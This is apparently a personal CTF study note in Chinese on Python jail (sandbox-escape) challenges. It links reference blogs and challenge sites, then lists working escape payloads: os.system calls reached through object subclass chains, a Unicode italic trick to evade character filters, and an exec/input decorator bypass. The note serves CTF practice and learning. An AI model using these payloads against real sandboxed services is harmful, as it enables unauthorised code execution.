---
tags:
  - notes
comments: true
dg-publish: true
---

> [!PREREQUISITE]
>
> 准备练练 python jail ，准备资料如下：
>
> - [Tr0y's Blog](https://www.tr0y.wang/)
>     - [Python 沙箱逃逸的经验总结](https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/)
>     - [Python 沙箱逃逸的通解探索之路](https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/)
>     - [Unicode 的使用](https://www.tr0y.wang/2020/08/18/IDN/#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF)
> - [nssctf](https://www.nssctf.cn/problem) (搜 jail 即可)
>     - [一个简单的题解](https://www.aiwin.fun/index.php/archives/3992/)
> - [github-autojail](https://github.com/martcl/autojail)
> - [moectf2024 题目链接](https://ctf.xidian.edu.cn/games/10/challenges?challenge=95)

- [Moejail](../../MOECTF2024/MISC.md#Moejail)

-  `__import__('os').system('ls')`
- `[i.__init__.__globals__['linecache'].__dict__['os'].system('whoami') for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "catch_warnings"]`
- `[i for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close"][0].__init__.__globals__['system']('cat ./flag')`
- 限制 A-z0-9 => https://lingojam.com/ItalicTextGenerator
- 限制 `'"{}[]()_` => ` @exec\n@input\nclass\tx:\n\tpass`

```python
@exec
@input
class x:
    pass

exec("@exec\n@input\nclass\tx:\n\tpass")
# exec("@𝘦𝘹𝘦𝘤\n@𝘪𝘯𝘱𝘶𝘵\n𝘤𝘭𝘢𝘴𝘴\t𝘹:\n\t𝘱𝘢𝘴𝘴")
```